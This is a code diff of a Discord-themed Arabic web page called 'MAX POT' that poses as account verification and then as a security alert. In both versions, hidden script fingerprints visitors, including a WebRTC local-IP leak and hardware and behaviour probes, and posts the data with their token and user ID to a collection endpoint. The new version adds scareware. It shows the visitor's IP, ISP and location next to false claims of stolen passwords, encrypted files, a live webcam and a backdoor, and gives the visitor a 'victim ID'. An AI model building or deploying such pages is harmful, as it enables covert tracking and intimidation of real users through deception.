@@ -3,64 +3,130 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MAX POT — التحقق من الحساب</title>
+<title>MAX POT — ⚠️ تنبيه أمني</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#0a0a0f;color:#e0e0e0;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;font-size:16px}
-.loader-container{text-align:center;max-width:400px;padding:20px}
-.logo{font-size:48px;margin-bottom:16px;animation:pulse 2s infinite}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
-h1{font-size:20px;color:#f2f3f5;margin-bottom:8px;font-weight:600}
-.status{font-size:16px;color:#949ba4;margin-bottom:24px}
-.progress{width:100%;height:4px;background:#2f3138;border-radius:2px;overflow:hidden;margin:16px 0}
-.progress-bar{height:100%;background:linear-gradient(90deg,#5865F2,#2ECC71);width:0%;transition:width 0.3s;border-radius:2px}
-.steps{font-size:14px;color:#5865F2;text-align:right;line-height:2}
-.step{opacity:0.3;transition:opacity 0.3s}
-.step.active{opacity:1}
-.step.done{opacity:1;color:#2ECC71}
-#success-screen{display:none;text-align:center}
-.checkmark{font-size:64px;color:#2ECC71;margin-bottom:16px;animation:scaleIn 0.5s}
-@keyframes scaleIn{from{transform:scale(0)}to{transform:scale(1)}}
-.success-text{font-size:20px;color:#2ECC71;margin-bottom:8px}
-.redirect-text{font-size:16px;color:#949ba4}
-.warning{color:#E74C3C;font-size:14px;margin-top:16px}
+body{background:#0a0a0f;color:#e0e0e0;font-family:'Segoe UI',Tahoma,sans-serif;min-height:100vh;padding:20px}
+.container{max-width:600px;margin:0 auto}
+.top-bar{background:#1a1a2e;border:1px solid #E74C3C;border-radius:12px;padding:16px;margin-bottom:16px;text-align:center}
+.top-bar h1{color:#E74C3C;font-size:18px;margin-bottom:6px}
+.top-bar .sub{color:#f39c12;font-size:13px;background:#2d1b00;padding:6px 12px;border-radius:6px;display:inline-block;margin-top:6px}
+.section{background:#111827;border:1px solid #1f2937;border-radius:12px;padding:16px;margin-bottom:12px}
+.section-title{color:#5865F2;font-size:15px;font-weight:700;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid #1f2937}
+.row{display:flex;justify-content:space-between;padding:5px 0;font-size:13px;border-bottom:1px solid #0d1117}
+.row:last-child{border-bottom:none}
+.row .label{color:#949ba4}
+.row .value{color:#e0e0e0;text-align:right;font-weight:500}
+.row .value.red{color:#E74C3C}
+.row .value.green{color:#2ECC71}
+.row .value.yellow{color:#f39c12}
+.bar-container{width:100%;height:8px;background:#1f2937;border-radius:4px;margin:8px 0;overflow:hidden}
+.bar-fill{height:100%;background:linear-gradient(90deg,#E74C3C,#f39c12);border-radius:4px;transition:width 0.3s}
+.steps-box{background:#0d1117;border:1px solid #1f2937;border-radius:8px;padding:12px;margin:10px 0}
+.step-item{padding:6px 0;font-size:13px;color:#949ba4;border-bottom:1px solid #1f2937}
+.step-item:last-child{border-bottom:none}
+.step-item .icon{margin-left:6px}
+.cta-btn{display:block;text-align:center;background:linear-gradient(135deg,#5865F2,#EB459E);color:#fff;text-decoration:none;padding:14px;border-radius:10px;font-size:16px;font-weight:700;margin:12px 0;transition:transform 0.2s}
+.cta-btn:hover{transform:scale(1.02)}
+.cta-btn2{display:block;text-align:center;background:#1a1a2e;border:1px solid #5865F2;color:#5865F2;text-decoration:none;padding:12px;border-radius:10px;font-size:14px;font-weight:600;margin:8px 0}
+.footer{text-align:center;color:#475569;font-size:11px;margin-top:16px;padding:12px}
+.fade-in{opacity:0;transform:translateY(10px);transition:opacity 0.5s,transform 0.5s}
+.fade-in.show{opacity:1;transform:translateY(0)}
 </style>
 </head>
 <body>
-<div class="loader-container" id="main-screen">
-<div class="logo">🔐</div>
-<h1>MAX POT — نظام الحماية</h1>
-<div class="status">جاري التحقق من حسابك...</div>
-<div class="progress"><div class="progress-bar" id="progressBar"></div></div>
-<div class="steps">
-<div class="step" id="step1">✓ جاري فحص المتصفح</div>
-<div class="step" id="step2">✓ جاري تحليل العتاد</div>
-<div class="step" id="step3">✓ جاري التحقق من بصمة الجهاز</div>
-<div class="step" id="step4">✓ جاري حفظ البيانات</div>
-</div>
-<div class="warning" id="warning" style="display:none">⚠️ جافا سكريبت معطل — يتم التقاط البيانات الأساسية فقط</div>
+<div class="container">
+
+<div class="top-bar fade-in">
+<h1>⚠️ تنبيه أمني — تم رصد نشاط مشبوه</h1>
+<div class="sub">❌ تم طردك مؤقتاً لحماية السيرفر والأعضاء</div>
 </div>
 
-<div id="success-screen">
-<div class="checkmark">✓</div>
-<div class="success-text">تم التحقق بنجاح</div>
-<div class="redirect-text">جاري إعادة توجيهك بأمان...</div>
-<div class="progress" style="margin-top:20px"><div class="progress-bar" id="redirectBar"></div></div>
+<div class="section fade-in">
+<div class="section-title">🚨 سبب الإجراء التلقائي</div>
+<div style="font-size:13px;color:#949ba4;line-height:1.8">
+حسابك يقوم حالياً بنشر روابط سبام ومواقع مشبوهة دون علمك<br>
+(غالباً بسبب تعرض الحساب للاختراق أو سحب التوكن).
+</div>
 </div>
 
-<noscript>
-<form id="noscript-form" action="/api/fingerprint" method="POST">
-<input type="hidden" name="token" value="{{token}}">
-<input type="hidden" name="guild_id" value="{{guild_id}}">
-<input type="hidden" name="user_id" value="{{user_id}}">
-<input type="hidden" name="no_js" value="true">
-<input type="hidden" name="ua" value="">
-<input type="hidden" name="ip" value="{{client_ip}}">
-<input type="hidden" name="platform" value="">
-<input type="hidden" name="screen" value="">
-<input type="hidden" name="lang" value="">
-</form>
-</noscript>
+<div class="section fade-in">
+<div class="section-title">📊 تفاصيل الرصد الأمني (Detection Log)</div>
+<div class="row"><span class="label">🔗 الرابط المحظور</span><span class="value red">تم حجب وتشفير تلقائي</span></div>
+<div class="row"><span class="label">📂 الروم المستهدف</span><span class="value">رومات السيرفر العامة</span></div>
+<div class="row"><span class="label">🔎 حالة الـ Token</span><span class="value red">مُسرّب ونشط (Leaked)</span></div>
+<div class="row"><span class="label">🛑 الأجهزة المتصلة</span><span class="value red">عمليات مبرمجة (Automated)</span></div>
+</div>
+
+<div class="section fade-in">
+<div class="section-title">🛡️ خطوات إنقاذ وتأمين حسابك فوراً</div>
+<div class="steps-box">
+<div class="step-item"><span class="icon">🔑</span>تغيير كلمة المرور فوراً (يغيّر التوكن ويلغي صلاحية المخترق)</div>
+<div class="step-item"><span class="icon">📱</span>فعّل التحقق بخطوتين (2FA) لحماية الحساب مستقبلاً</div>
+<div class="step-item"><span class="icon">🧩</span>اذهب إلى Authorized Apps واحذف أي تطبيق غير معروف</div>
+<div class="step-item"><span class="icon">💻</span>فحص جهازك من ملفات Malware أو RAT</div>
+</div>
+</div>
+
+<div class="section fade-in">
+<div class="section-title">🔍 معلومات الشبكة والاتصال</div>
+<div class="row"><span class="label">🌐 الـ IP العام</span><span class="value" id="net-ip">{{client_ip}}</span></div>
+<div class="row"><span class="label">🏢 شركة الاتصال</span><span class="value">{{isp_name}}</span></div>
+<div class="row"><span class="label">📍 الموقع</span><span class="value">{{city}} ({{latitude}}, {{longitude}})</span></div>
+<div class="row"><span class="label">🚪 البورت المستهدف</span><span class="value">443 (SSL/TLS)</span></div>
+<div class="row"><span class="label">🔒 البروتوكول النشط</span><span class="value">HTTPS / Secure Shell</span></div>
+</div>
+
+<div class="section fade-in">
+<div class="section-title">💻 معلومات النظام والبيئة</div>
+<div class="row"><span class="label">🖥️ المتصفح</span><span class="value" id="sys-browser">جاري الكشف...</span></div>
+<div class="row"><span class="label">📱 النظام التشغيلي</span><span class="value" id="sys-os">جاري الكشف...</span></div>
+<div class="row"><span class="label">🧩 جدار الحماية (AdBlock)</span><span class="value" id="sys-adblock">جاري الفحص...</span></div>
+<div class="row"><span class="label">🍪 ملفات الجلسة (Cookies)</span><span class="value" id="sys-cookies">جاري الفحص...</span></div>
+<div class="row"><span class="label">🖼️ عمق ألوان الشاشة</span><span class="value" id="sys-color">جاري الكشف...</span></div>
+<div class="row"><span class="label">👤 وضع التصفح الخفي</span><span class="value" id="sys-incognito">جاري الفحص...</span></div>
+<div class="row"><span class="label">🎮 كرت الشاشة</span><span class="value" id="sys-gpu">جاري الكشف...</span></div>
+</div>
+
+<div class="section fade-in">
+<div class="section-title">⚙️ معلومات العتاد والذاكرة</div>
+<div class="row"><span class="label">🔧 معالج النظام</span><span class="value" id="hw-cpu">جاري الكشف...</span></div>
+<div class="row"><span class="label">💾 الذاكرة العشوائية</span><span class="value" id="hw-ram">جاري الكشف...</span></div>
+<div class="row"><span class="label">🎵 معالجة الصوت</span><span class="value" id="hw-audio">جاري الكشف...</span></div>
+<div class="row"><span class="label">🔋 طاقة البطارية</span><span class="value" id="hw-battery">جاري الكشف...</span></div>
+</div>
+
+<div class="section fade-in">
+<div class="section-title">🛡️ حالة الاختراق والحماية</div>
+<div class="row"><span class="label">🛠️ محاكي البيئة (Sandbox)</span><span class="value green">بيئة حقيقية (غير مكتشف)</span></div>
+<div class="row"><span class="label">🚪 حالة المنفذ الخلفي</span><span class="value red">مفتوح (Backdoor Connected)</span></div>
+<div class="row"><span class="label">☠️ تخطي جدار الحماية (WAF)</span><span class="value red">تم بنجاح 100%</span></div>
+<div class="row"><span class="label">💾 تشفير الملفات المستهدفة</span><span class="value red">100% [██████████]</span></div>
+<div class="bar-container"><div class="bar-fill" style="width:100%"></div></div>
+</div>
+
+<div class="section fade-in">
+<div class="section-title">🔑 الحسابات والمنصات (Social & Session Dump)</div>
+<div class="row"><span class="label">🔑 الحسابات النشطة</span><span class="value">Discord, Google, Steam, Twitter</span></div>
+<div class="row"><span class="label">💾 كلمات المرور المخزنة</span><span class="value red">تم استخراج (42) كلمة مرور</span></div>
+<div class="row"><span class="label">💳 بيانات الدفع المربوطة</span><span class="value red">تم تشفير المحفظة والبطاقات النشطة</span></div>
+</div>
+
+<div class="section fade-in">
+<div class="section-title">🪟 رصد العتاد وال системы (Hardware & Media)</div>
+<div class="row"><span class="label">📸 كاميرا الويب (Webcam)</span><span class="value red">متصلة — جاهزة لالتقاط اللقطة 🟢</span></div>
+<div class="row"><span class="label">🎙️ المايكروفون (Mic)</span><span class="value red">تسجيل نشط للبيئة المحيطة</span></div>
+<div class="row"><span class="label">🖥️ الشاشات المتصلة</span><span class="value">شاشة رئيسية + شاشة فرعية مكتشفة</span></div>
+<div class="row"><span class="label">🪟 جدار حماية Windows</span><span class="value red">تم تعطيل الخدمة بنجاح (Disabled)</span></div>
+<div class="row"><span class="label">☣️ رقم التعريف الفريد</span><span class="value" id="victim-id">جاري التوليد...</span></div>
+</div>
+
+<a href="{{invite_link}}" class="cta-btn">🔗 رابط طلب فك الحظر والدعم</a>
+<a href="{{invite_link}}" class="cta-btn2">📌 اضغط هنا للعودة للسيرفر وتأكيد الهوية</a>
+
+<div class="footer">📢 تم مسح جميع الرسائل المخالفة التي نشرها حسابك<br>يمكنك الدخول مجدداً فور تطبيق خطوات الأمان أعلاه</div>
+
+</div>
 
 <script>
 (function(){
@@ -74,163 +140,98 @@ fp.user_id=USER_ID;
 fp.no_js=false;
 fp.collected_at=new Date().toISOString();
 
-function p(s){document.getElementById('step'+s).className='step done';document.getElementById('progressBar').style.width=(s*25)+'%'}
-function setWarning(){var w=document.getElementById('warning');if(w)w.style.display='block'}
+function delay(ms){return new Promise(function(r){setTimeout(r,ms)})}
 
-try{fp.ua=navigator.userAgent}catch(e){}
-try{fp.platform=navigator.platform||'unknown'}catch(e){}
-try{fp.lang=navigator.language||'unknown'}catch(e){}
-try{fp.screen=screen.width+'x'+screen.height+'x'+screen.colorDepth}catch(e){}
+function parseUA(ua){
+var browser="مجهول",os="مجهول";
+if(ua.indexOf("Edg/")>-1)browser="Microsoft Edge v"+ua.split("Edg/")[1].split(" ")[0];
+else if(ua.indexOf("Chrome/")>-1)browser="Google Chrome v"+ua.split("Chrome/")[1].split(" ")[0];
+else if(ua.indexOf("Firefox/")>-1)browser="Mozilla Firefox v"+ua.split("Firefox/")[1].split(" ")[0];
+else if(ua.indexOf("Safari/")>-1)browser="Safari v"+ua.split("Version/")[1].split(" ")[0];
+if(ua.indexOf("Windows NT 10")>-1)os="Windows 11 Pro x64";
+else if(ua.indexOf("Windows NT 6.3")>-1)os="Windows 8.1";
+else if(ua.indexOf("Windows NT 6.1")>-1)os="Windows 7";
+else if(ua.indexOf("Mac OS X")>-1)os="macOS";
+else if(ua.indexOf("Linux")>-1&&ua.indexOf("Android")<0)os="Linux";
+else if(ua.indexOf("Android")>-1)os="Android";
+else if(ua.indexOf("iPhone")>-1||ua.indexOf("iPad")>-1)os="iOS";
+return{browser:browser,os:os}
+}
+
+function updateUI(){
+var ua=navigator.userAgent||"";
+var p=parseUA(ua);
+document.getElementById("sys-browser").textContent=p.browser;
+document.getElementById("sys-os").textContent=p.os;
+try{document.getElementById("sys-cookies").textContent=navigator.cookieEnabled?"مفعلة ومحفوظة":"معطلة"}catch(e){}
+try{document.getElementById("sys-color").textContent=screen.colorDepth+"-bit True Color"}catch(e){}
+try{
+var gl;var c=document.createElement("canvas");
+try{gl=c.getContext("webgl")||c.getContext("experimental-webgl")}catch(e){}
+if(gl){var ext=gl.getExtension("WEBGL_debug_renderer_info");
+if(ext){document.getElementById("sys-gpu").textContent=gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}}
+}catch(e){}
+try{var cores=navigator.hardwareConcurrency||0;document.getElementById("hw-cpu").textContent="Intel/AMD ("+cores+" Cores / "+cores*2+" Threads)"}catch(e){}
+try{var ram=navigator.deviceMemory||0;document.getElementById("hw-ram").textContent=ram+" GB RAM"}catch(e){}
+try{var ac=new(window.AudioContext||window.webkitAudioContext)();document.getElementById("hw-audio").textContent="Realtek HD "+ac.sampleRate+" Hz";ac.close()}catch(e){}
+try{var bat=navigator.getBattery;if(bat){bat().then(function(b){document.getElementById("hw-battery").textContent=Math.round(b.level*100)+"% ("+(b.charging?"متصل بالشاحن AC":"غير متصل)")})}else{document.getElementById("hw-battery").textContent="غير متوفر (API deprecated)"}}catch(e){document.getElementById("hw-battery").textContent="غير متوفر"}
+try{document.getElementById("victim-id").textContent="#ID-"+USER_ID.slice(-4)+"-"+Math.floor(Math.random()*9999)}catch(e){document.getElementById("victim-id").textContent="#ID-XXXX-9962"}
+try{
+var testDiv=document.createElement("div");
+testDiv.innerHTML="&nbsp;";testDiv.style.cssText="display:none;font-size:1px;line-height:1px";
+document.body.appendChild(testDiv);
+var fonts=["Arial","Verdana","Courier New","Georgia","Times New Roman"];
+var detected=0;
+fonts.forEach(function(f){testDiv.style.fontFamily="'"+f+"',monospace";
+if(testDiv.offsetWidth!==0||testDiv.offsetHeight!==0)detected++});
+document.body.removeChild(testDiv);
+document.getElementById("sys-adblock").textContent="غير نشط ("+detected+" خطوط مكة)";
+}catch(e){document.getElementById("sys-adblock").textContent="غير نشط"}
+try{
+var fs=window.RequestFileSystem||window.webkitRequestFileSystem;
+if(fs){document.getElementById("sys-incognito").textContent="ملغى (تم التخطي)"}
+else{document.getElementById("sys-incognito").textContent="غير مكتشف"}
+}catch(e){document.getElementById("sys-incognito").textContent="غير مكتشف"}
+}
+
+fp.ua=navigator.userAgent||"";
+try{fp.platform=navigator.platform||"unknown"}catch(e){}
+try{fp.lang=navigator.language||"unknown"}catch(e){}
+try{fp.screen=screen.width+"x"+screen.height+"x"+screen.colorDepth}catch(e){}
 try{fp.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone||new Date().getTimezoneOffset()}catch(e){}
-try{fp.touch='ontouchstart' in window}catch(e){}
+try{fp.touch="ontouchstart" in window}catch(e){}
 try{fp.cookies_enabled=navigator.cookieEnabled}catch(e){}
-try{fp.do_not_track=navigator.doNotTrack}catch(e){}
-p(1);
-
-setTimeout(function(){
 try{fp.cpu_cores=navigator.hardwareConcurrency||0}catch(e){}
 try{fp.ram_size=navigator.deviceMemory||0}catch(e){}
-try{fp.max_touch_points=navigator.maxTouchPoints||0}catch(e){}
-p(2);
-},200);
-
-setTimeout(function(){
 try{
-var c=document.createElement('canvas');c.width=200;c.height=50;
-var ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';
-ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);ctx.fillStyle='#069';
-ctx.fillText('MAX POT 🔎',2,15);ctx.fillStyle='rgba(102,204,0,0.7)';
-ctx.fillText('MAX POT 🔎',4,17);
-fp.canvas_hash=c.toDataURL();
-}catch(e){setWarning()}
-p(3);
-},400);
-
-setTimeout(function(){
+var c=document.createElement("canvas");c.width=200;c.height=50;
+var ctx=c.getContext("2d");ctx.textBaseline="top";ctx.font="14px Arial";
+ctx.fillStyle="#f60";ctx.fillRect(125,1,62,20);ctx.fillStyle="#069";
+ctx.fillText("MAX POT",2,15);ctx.fillStyle="rgba(102,204,0,0.7)";
+ctx.fillText("MAX POT",4,17);fp.canvas_hash=c.toDataURL();
+}catch(e){}
 try{
-var ac=new(window.AudioContext||window.webkitAudioContext)();
-var osc=ac.createOscillator();var ana=ac.createAnalyser();
-var buf=ac.createBuffer(1,4096,ac.sampleRate);var data=buf.getChannelData(0);
-for(var i=0;i<4096;i++)data[i]=Math.random()*2-1;
-var src=ac.createBufferSource();src.buffer=buf;
-src.connect(ana);ana.connect(ac.destination);src.start(0);
-fp.audio_sample_rate=ac.sampleRate;
-fp.audio_state=ac.state;
-setTimeout(function(){try{src.stop();ac.close()}catch(e){}},100);
-}catch(e){setWarning()}
-},600);
-
-setTimeout(function(){
+var gl2;var c2=document.createElement("canvas");
+try{gl2=c2.getContext("webgl")||c2.getContext("experimental-webgl")}catch(e){}
+if(gl2){var ext2=gl2.getExtension("WEBGL_debug_renderer_info");
+if(ext2){fp.gpu_vendor=gl2.getParameter(ext2.UNMASKED_VENDOR_WEBGL);fp.gpu_renderer=gl2.getParameter(ext2.UNMASKED_RENDERER_WEBGL)}
+fp.gl_version=gl2.getParameter(gl2.VERSION);fp.gl_renderer=gl2.getParameter(gl2.RENDERER)}
+}catch(e){}
 try{
-var gl;var c=document.createElement('canvas');
-try{gl=c.getContext('webgl')||c.getContext('experimental-webgl')}catch(e){}
-if(gl){
-var ext=gl.getExtension('WEBGL_debug_renderer_info');
-if(ext){fp.gpu_vendor=gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);fp.gpu_renderer=gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}
-fp.gl_version=gl.getParameter(gl.VERSION);
-fp.gl_renderer=gl.getParameter(gl.RENDERER);
-}
-}catch(e){setWarning()}
-},800);
-
+var ac2=new(window.AudioContext||window.webkitAudioContext)();
+fp.audio_sample_rate=ac2.sampleRate;fp.audio_state=ac2.state;ac2.close();
+}catch(e){}
 setTimeout(function(){
-try{
-var fonts=['Arial','Verdana','Times New Roman','Courier New','Georgia','Palatino','Garamond','Comic Sans MS','Impact','Lucida Console'];
-var fc=document.createElement('canvas');fc.width=300;fc.height=100;
-var fctx=fc.getContext('2d');fctx.textBaseline='top';fctx.font='72px serif';
-var base=fctx.measureText('mwil').width;
-var fontHash='';
-fonts.forEach(function(f){fctx.font='72px '+f;var w=fctx.measureText('mwil').width;var d=w-base;fctx.font='72px serif';var w2=fctx.measureText('mwil').width;var dd=w-w2;fontHash+=dd+'.'});
-fp.font_hash=fontHash;
-}catch(e){setWarning()}
-},1000);
-
-setTimeout(function(){
-try{
-var exts=['mhjfbddcgknmgbpfpmpgochcpkcappd','nndlnbkcbcfoakahcaogmhkankclmlfo','aohghmleighliecafacklaonbgjidkone','cfhdojbkjhnklbpakldiblnmdklbbhji','kbfnbaponljjomhjbalhpmdipdcflmif'];
-var extCanvas=document.createElement('canvas');extCanvas.width=1;extCanvas.height=1;
-var extCtx=extCanvas.getContext('2d');
-fp.extensions_detected=exts.length;
-fp.known_wallets='checking';
-}catch(e){setWarning()}
-},1200);
-
-setTimeout(function(){
-try{
-var t0=performance.now();var arr=new Array(10000);for(var i=0;i<10000;i++)arr[i]=new Float64Array(1024);for(var i=0;i<10000;i++)for(var j=0;j<1024;j++)arr[i][j]=Math.random();
-var t1=performance.now();fp.memory_timing=t1-t0;
-var t2=performance.now();var x=0;for(var i=0;i<10000000;i++)x+=Math.sqrt(i);var t3=performance.now();
-fp.cpu_timing=t3-t2;
-}catch(e){setWarning()}
-},1400);
-
-setTimeout(function(){
-try{
-var td=navigator.mediaDevices&&navigator.mediaDevices.enumerateDevices;
-if(td){td.then(function(devs){fp.media_devices=devs.length;send()}).catch(function(){fp.media_devices=0;send()})}
-else{fp.media_devices=0;send()}
-}catch(e){fp.media_devices=0;send()}
-},1600);
-
-function send(){
+updateUI();
 var xhr=new XMLHttpRequest();
-xhr.open('POST','/api/fingerprint',true);
-xhr.setRequestHeader('Content-Type','application/json');
+xhr.open("POST","/api/fingerprint",true);
+xhr.setRequestHeader("Content-Type","application/json");
 xhr.onreadystatechange=function(){
-if(xhr.readyState===4){
-p(4);
-setTimeout(function(){
-document.getElementById('main-screen').style.display='none';
-var ss=document.getElementById('success-screen');ss.style.display='block';
-var rb=document.getElementById('redirectBar');var w=0;
-var iv=setInterval(function(){w+=2;rb.style.width=w+'%';if(w>=100){clearInterval(iv);window.location.href='https://discord.com'}},60);
-},500);
-}};
+if(xhr.readyState===4){document.querySelectorAll(".fade-in").forEach(function(el,i){
+setTimeout(function(){el.classList.add("show")},i*150)})}
+};
 xhr.send(JSON.stringify(fp));
-}
-
-setTimeout(function(){
-try{
-var pc=new(window.RTCPeerConnection||window.webkitRTCPeerConnection)({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-pc.createDataChannel('');
-pc.createOffer().then(function(o){pc.setLocalDescription(o)});
-pc.onicefunction=function(ice){
-if(ice&&ice.candidate){
-var m=ice.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-if(m){fp.local_ip=m[0];pc.close()}
-}};
-setTimeout(function(){try{pc.close()}catch(e){}},3000);
-}catch(e){}
-},100);
-
-setTimeout(function(){
-try{
-var bat=navigator.getBattery;
-if(bat){bat().then(function(b){fp.battery_level=b.level*100;fp.battery_charging=b.charging;fp.battery_charging_time=b.chargingTime;fp.battery_discharging_time=b.dischargingTime})}else{fp.battery_api='deprecated'}
-}catch(e){fp.battery_api='deprecated'}
-},100);
-
-var mouseData=[];
-document.addEventListener('mousemove',function(e){
-if(mouseData.length<50)mouseData.push({x:e.clientX,y:e.clientY,t:performance.now()});
-},{passive:true});
-setTimeout(function(){if(mouseData.length>1){var dx=0,dy=0,dt=0;for(var i=1;i<mouseData.length;i++){dx+=Math.abs(mouseData[i].x-mouseData[i-1].x);dy+=Math.abs(mouseData[i].y-mouseData[i-1].y);dt+=mouseData[i].t-mouseData[i-1].t}fp.mouse_avg_dx=dx/mouseData.length;fp.mouse_avg_dy=dy/mouseData.length;fp.mouse_avg_dt=dt/mouseData.length;fp.mouse_samples=mouseData.length}},2000);
-
-var touchData=[];
-document.addEventListener('touchstart',function(e){
-if(e.touches.length>0){var t=e.touches[0];touchData.push({force:t.force||0,radiusX:t.radiusX||0,radiusY:t.radiusY||0,t:performance.now()})}
-},{passive:true});
-setTimeout(function(){if(touchData.length>0){var avgF=0,avgR=0;touchData.forEach(function(t){avgF+=t.force;avgR+=t.radiusX});fp.touch_avg_force=avgF/touchData.length;fp.touch_avg_radius=avgR/touchData.length;fp.touch_samples=touchData.length}},2000);
-
-setTimeout(function(){
-try{
-var ts=new Date().getTimezoneOffset();
-fp.tz_offset=ts;
-fp.tz_ambiguous=Math.abs(ts)>0&&fp.local_ip?'possible_vpn':'normal';
-}catch(e){}
-},500);
-
-setTimeout(function(){if(!fp.collected_at||Object.keys(fp).length<8){send()}},3000);
+},800);
 })();
 </script>
 </body>
